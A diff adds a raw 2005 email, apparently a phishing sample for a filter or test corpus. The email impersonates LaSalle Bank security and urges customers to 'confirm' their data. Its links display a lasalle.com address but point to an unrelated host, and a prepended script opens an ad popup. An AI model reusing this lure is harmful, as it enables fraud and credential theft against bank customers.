@@ -1,0 +1,93 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <root@mail.magbelle.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id 6EDAA536E65
+ for <username@login.domain.com>; Mon, 25 Apr 2005 13:42:43 -0400 (EDT)
+Received: from mail.magbelle.com (unknown [68.152.44.4])
+ by mail1.domain.com (Postfix) with ESMTP id EA21685AC31
+ for <username@domain.com>; Mon, 25 Apr 2005 13:42:42 -0400 (EDT)
+Received: from mail.magbelle.com (localhost.localdomain [127.0.0.1])
+ by mail.magbelle.com (8.12.10/8.12.10) with ESMTP id j3PHo3np001053
+ for <username@domain.com>; Mon, 25 Apr 2005 12:50:03 -0500
+Received: (from root@localhost)
+ by mail.magbelle.com (8.12.10/8.12.10/Submit) id j3PHo2db001051;
+ Mon, 25 Apr 2005 12:50:02 -0500
+Date: Mon, 25 Apr 2005 12:50:02 -0500
+Message-Id: <200504251750.j3PHo2db001051@mail.magbelle.com>
+To: username@domain.com
+Subject: IMPORTANT:Security Issues *LaSalle Bank*
+From: "security@lasallebank.com" <security@lasallebank.com>
+Content-Type: text/html
+X-Virus-Scanned: clamd / ClamAV version 0.75.1, clamav-milter version 0.75c
+ on mail
+X-Virus-Status: Clean
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 293
+
+
+<!-- HOME.RO Banners v0.1 -->
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+browser = (((navigator.appName == "Netscape") && (parseInt(navigator.appVersion) >= 2 )) || ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 2 )));
+if (browser) {
+if (parent.name != 'homepopup') {
+   open_this = 'http://www.home.ro/ads.php3?CLIENT=' + window.location;
+   homepopup = window.open(open_this, "homepopup", "width=500,height=80");
+}
+}
+//-->
+</SCRIPT>
+<!-- END HOME.RO Banners -->
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dear LaSalle Bank customer</title>
+</head>
+
+<body>
+
+<CENTER>
+<font face="Verdana" style="font-size: 9pt">&nbsp; This message contains 
+graphics. If you do not see the graphics,
+<b>
+<a target="_blank" 
+ href="http://www.bairesac.com/.lasalle/Security/www.lasallebank.com"><FONT
+color=#003399>click here to view</FONT></a></b>.</font></CENTER><!--VERSION value="4.3.0"-->
+<TABLE cellSpacing=0 cellPadding=0 width=774 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy" height="42">
+<a target="_blank" href="http://www.bairesac.com/.lasalle/Security/www.lasallebank.com">
+<img border="0" src="http://www.lasallebank.com/templates/images/lasalle_logo.gif" width="146" height="54"></a></TD></TR>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy">
+
+<p align="left"><font face="Verdana" size="2">Dear client of LaSalle Bank,</font></p>
+<p align="justify"><font face="Verdana" size="2">Technical services of the 
+LaSalle Bank are carrying out a planned software upgrade. We earnestly ask you 
+to visit the following link to start the procedure of confirmation on customers 
+data.</font></p>
+<p align="justify"><font face="Verdana" size="2">To get started, please click 
+the link below:</font></p>
+<p align="justify"><font face="Verdana" size="2">
+<b>
+<a target="_blank" 
+href="http://www.bairesac.com/.lasalle/Security/www.lasallebank.com">
+https://online.lasalle.com/ibslasalle/cmserver/users/default/confirm.cfm</a></b></font></p>
+<p align="justify"><font face="Verdana" size="2">This instruction has been sent 
+to all bank customers and is obligatory to fallow.</font></p>
+<p align="justify"><font face="Verdana" size="2">Thank you,</font></p>
+<p align="justify"><font face="Verdana" size="2">Customers Support Service.</font></p></TD></TR>
+</TBODY></TABLE>
+
+</body>
+
+</html>
